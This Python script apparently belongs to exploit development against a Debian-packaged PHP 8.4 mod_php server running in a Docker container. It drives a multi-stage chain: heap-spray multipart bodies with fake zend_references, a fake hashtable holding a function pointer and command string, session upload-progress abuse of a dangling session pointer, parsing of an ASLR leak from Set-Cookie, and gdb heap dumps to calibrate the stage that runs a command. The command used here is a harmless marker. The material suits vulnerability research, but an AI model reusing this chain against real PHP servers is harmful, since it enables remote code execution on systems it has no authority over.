#!/usr/bin/env python3
"""Debian package: A2 + harmless (rc=2) B2, then dump the child's 2MiB chunk.

Finds where the fake `ht` zend_array and the fake zend_references actually land
relative to the A2 dangling PS(http_session_vars) pointer, so the B2 anchor can
be corrected for the distro binary.
"""
import json, os, struct, subprocess, sys, time

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D, "scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from fake_ref_b import make_spray, make_name
from mk_ht import build as build_ht

CNAME = "m109-d8424pkg"
PORT = 18740
LOG = "/var/log/apache2/p2s-access.log"
BOUND = b"C" * 10


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def pids():
    r = sh(["docker", "exec", CNAME, "sh", "-c",
            "ps -eo pid,user,comm | awk '$2==\"www-data\"&&$3==\"apache2\"{print $1}'"])
    return [int(x) for x in r.stdout.split()]


def state(pid):
    r = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/deb_state.gdb"])
    for line in r.stdout.splitlines():
        if line.startswith("DEBSTATE"):
            return dict(kv.split("=", 1) for kv in line.split()[1:])
    return {"err": (r.stdout + r.stderr).strip()[-300:]}


def log_lines():
    return sh(["docker", "exec", CNAME, "sh", "-c", "cat %s 2>/dev/null" % LOG]).stdout.splitlines()


def diag_b2(S, zif, cmd, rc=2, n1=500, n2=495, vl=384):
    spray = make_spray(vl, S, rc, 0x0107, 8, 32)
    ht = build_ht(S, zif, cmd.encode(), 384)

    def part(name, value):
        return (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUND + b"--\r\n"
    return bytes(body)


def dump_chunk(pid, path_host, hsv_off=0):
    inside = "/tmp/chunk_%d.bin" % pid
    script = """set pagination off
set confirm off
python
import gdb
inf=gdb.selected_inferior()
ag=int(gdb.parse_and_eval('&alloc_globals'))&0xffffffffffffffff
def u64(a): return int.from_bytes(inf.read_memory(a,8).tobytes(),'little')
h=u64(ag); m=h&~0x1fffff
gdb.execute('dump memory %s %%#x %%#x' %% (m, m+0x200000))
print('HEAP %%#x MAIN %%#x' %% (h, m), flush=True)
end
quit
""" % inside
    local = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z/out/debdiag2/dump_%d.gdb" % pid
    open(local, "w").write(script)
    sh(["docker", "cp", local, CNAME + ":/tmp/dump.gdb"])
    p = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/dump.gdb"])
    print("dump:", [l for l in p.stdout.splitlines() if l.startswith("HEAP")], p.stderr[-200:] if p.returncode else "", flush=True)
    r = sh(["docker", "cp", "%s:%s" % (CNAME, inside), path_host])
    return r.returncode == 0


def main():
    outdir = os.path.join(D, "out/debdiag2")
    os.makedirs(outdir, exist_ok=True)
    rec = {}
    print("== restart", flush=True)
    sh(["docker", "restart", CNAME])
    time.sleep(2.0)

    # baseline
    base = {p: state(p) for p in pids()}
    print("baseline", json.dumps(base, indent=1)[:400], flush=True)

    # A1
    n = len(log_lines())
    pr = C.send_chunked(PORT, "/index.php?q0000000=v", os.path.join(D, "bodies/a1.bin"),
                        os.path.join(outdir, "a1.resp"))
    pr.wait(timeout=300)
    a1 = open(os.path.join(outdir, "a1.resp"), "rb").read()
    time.sleep(0.2)
    a1log = log_lines()[n:]
    a1pid = int(a1log[-1].split()[0]) if a1log else None
    print("A1", a1.split(b"\r\n", 1)[0], a1log, flush=True)
    rec["a1"] = {"pid": a1pid, "log": a1log, "state": state(a1pid) if a1pid else None}
    print("A1 state", rec["a1"]["state"], flush=True)

    # B1 x5
    n = len(log_lines())
    procs = []
    for i in range(5):
        s = os.path.join(outdir, "b1_%d.resp" % i)
        procs.append((i, s, C.send_chunked(PORT, "/index.php", os.path.join(D, "bodies/b1.bin"), s)))
    for i, s, p in procs:
        try:
            p.wait(timeout=300)
        except subprocess.TimeoutExpired:
            p.kill()
    time.sleep(0.3)
    b1log = log_lines()[n:]
    print("B1 log", b1log, flush=True)
    hit = None
    for i in range(5):
        data = open(os.path.join(outdir, "b1_%d.resp" % i), "rb").read()
        if b"Set-Cookie: PHPSESSID=" in data:
            try:
                info = C.parse_leak(data, 0x424ff0)
                print("B1 i=%d decoded=%d lib=%#x cands=%s" % (i, info["decoded"], info["lib"], info["cand_counts"]), flush=True)
                if hit is None and info["main_candidates"]:
                    hit = info
            except Exception as e:
                print("B1 i=%d err %s" % (i, e), flush=True)
    rec["b1"] = {"log": b1log}
    if not hit:
        print("no leak", flush=True)
        return 3
    real = state(a1pid)
    main = int(real["main"], 16) if "main" in real else hit["main_candidates"][0]
    lib = int(real["lib"], 16) if "lib" in real else hit["lib"]
    print("real main=%#x lib=%#x leak main0=%#x lib=%#x" % (main, lib, hit["main_candidates"][0], hit["lib"]), flush=True)
    rec["main"] = hex(main); rec["lib"] = hex(lib)
    rec["leak_cands"] = hit["cand_counts"]

    # A2
    n = len(log_lines())
    a2 = C.a2_body()
    r = C.send_plain(PORT, "/index.php", a2)
    time.sleep(0.3)
    a2log = log_lines()[n:]
    a2pid = int(a2log[-1].split()[0]) if a2log else None
    st = state(a2pid) if a2pid else None
    print("A2", r.split(b"\r\n", 1)[0], a2log, st, flush=True)
    rec["a2"] = {"pid": a2pid, "log": a2log, "state": st}
    hsv = int(st["hsv"], 16) if st and st.get("hsv") not in (None, "0x0") else None
    hsvoff = hsv - main if hsv else None
    print("hsv=%s hsvoff=%s" % (hex(hsv) if hsv else None, hex(hsvoff) if hsvoff is not None else None), flush=True)
    rec["hsv"] = hex(hsv) if hsv else None
    rec["hsvoff"] = hex(hsvoff) if hsvoff is not None else None

    # harmless B2, aimed at the same child if possible
    S = main + 0xF8398
    zif = lib + 0x24cdd0
    cmd = "DEBMARK_0xF8398"
    body = diag_b2(S, zif, cmd, rc=2)
    n = len(log_lines())
    resp = C.send_plain(PORT, "/index.php", body)
    time.sleep(0.3)
    blog = log_lines()[n:]
    bpid = int(blog[-1].split()[0]) if blog else None
    print("diagB2", resp.split(b"\r\n", 1)[0], blog, flush=True)
    rec["b2diag"] = {"pid": bpid, "log": blog, "S": hex(S), "zif": hex(zif), "cmd": cmd,
                     "bytes": len(body), "hsv": rec["hsv"]}
    if bpid:
        rec["b2diag"]["state"] = state(bpid)
        print("diagB2 state", rec["b2diag"]["state"], flush=True)
        chunk = os.path.join(outdir, "chunk_pid%d.bin" % bpid)
        ok = dump_chunk(bpid, chunk)
        rec["b2diag"]["chunk"] = chunk if ok else None
        # dump the hsv zval target area
        print("chunk saved", ok, chunk, flush=True)

    # also dump the child that got A2 even if B2 went elsewhere
    if a2pid and a2pid != bpid:
        chunk = os.path.join(outdir, "chunk_a2pid%d.bin" % a2pid)
        if dump_chunk(a2pid, chunk):
            rec.setdefault("a2", {})["chunk"] = chunk
    json.dump(rec, open(os.path.join(outdir, "diag2.json"), "w"), indent=1)
    print("saved", os.path.join(outdir, "diag2.json"), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
